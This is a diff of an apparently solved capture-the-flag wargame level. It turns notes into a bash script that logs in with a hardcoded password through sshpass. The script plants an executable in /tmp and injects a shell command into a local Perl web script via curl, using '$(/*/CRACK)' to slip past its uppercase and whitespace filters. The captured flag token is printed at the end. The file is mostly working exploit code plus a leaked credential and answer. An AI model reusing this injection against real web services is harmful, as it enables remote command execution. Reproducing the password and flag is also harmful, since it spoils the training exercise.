@@ -1,21 +1,19 @@
-getfacl level12.pl
+#!/bin/bash
 
-# localhost:4646
+ssh() {
+    sshpass -p 'fa6v5ateaw21peobuub8ipe6s' ssh level12@localhost -p 2220 "$1"  
+}
 
-$xx = $_[0];
+ssh "ls -la"
 
-# Filter 1: Converts all lowercase to UPPERCASE
-$xx =~ tr/a-z/A-Z/; 
+ssh "getfacl level12.pl"
 
-# Filter 2: Deletes everything after the first whitespace
-$xx =~ s/\s.*//;
+ssh "cat level12.pl"
 
-@output = `egrep "^$xx" /tmp/xd 2>&1`;
+ssh 'echo "getflag > /tmp/flag" > /tmp/CRACK && chmod +x /tmp/CRACK && curl "localhost:4646/?x=\$(/*/CRACK)"'
 
-echo "getflag > /tmp/flag12" > /tmp/CRACK
+sleep 2
 
-# Shell execute anything inside the bracket. 
-$(...)
-curl 'localhost:4646/?x=$(/*/CRACK)'
+ssh 'cat /tmp/flag'
 
-#g1qKMiRpXf53AWhDaU7FEkczr
+# Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
